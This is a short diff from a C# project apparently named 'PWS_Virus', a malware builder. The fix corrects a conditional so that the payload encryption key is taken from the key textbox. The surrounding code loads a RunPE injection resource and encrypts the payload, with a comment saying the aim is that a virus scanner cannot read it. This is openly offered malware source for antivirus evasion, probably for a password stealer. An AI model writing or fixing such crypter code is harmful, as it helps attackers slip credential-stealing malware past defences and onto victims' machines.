@@ -129,7 +129,7 @@ namespace PWS_Virus
             byte[] injBytes = PWS_Virus.Properties.Resources.RunpeResource;
 
             //create an encryption key if one hasnt already been made (shorthand if statement)
-            string encKey = "enc" + ((tbPayload.Text == "") ? Guid.NewGuid().ToString().Replace("-", "") : tbKey.Text);
+            string encKey = "enc" + ((tbKey.Text == "") ? Guid.NewGuid().ToString().Replace("-", "") : tbKey.Text);
 
             //Encrypt the bytes so a virusscanner cant read out the payload
             Payload = _Encrypt(Payload, encKey);
